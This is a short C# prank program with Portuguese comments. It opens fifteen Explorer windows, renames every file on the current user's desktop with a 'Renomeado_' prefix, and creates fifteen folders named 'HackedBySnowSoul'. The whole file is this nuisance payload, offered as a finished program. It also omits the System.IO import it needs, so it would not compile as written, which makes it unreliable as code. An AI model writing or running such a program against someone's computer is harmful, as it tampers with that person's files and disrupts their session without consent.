using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;


class Program
{
    static void Main()
    {
        //Abrir Arquivos
        int numero = 0;
        while(numero < 15)
        {
            Process.Start("explorer.exe");
            numero++;
        }

        //Renomear Arquivos no Desktop
        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string[] files = Directory.GetFiles(desktopPath);
        foreach (string file in files)
        {
            string fileName = Path.GetFileName(file);
            string newFileName = "Renomeado_" + fileName;
            string newFilePath = Path.Combine(desktopPath, newFileName);
            File.Move(file, newFilePath);
        }

        //CriarPastas
        string desktopPath1 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string folderName = "HackedBySnowSoul";
        int numeroPasta = 0;

        while(numeroPasta < 15)
        {
            string folderPath = Path.Combine(desktopPath1, $"{folderName}_{numeroPasta}");
            Directory.CreateDirectory(folderPath);
            numeroPasta++;
        }
    }
}
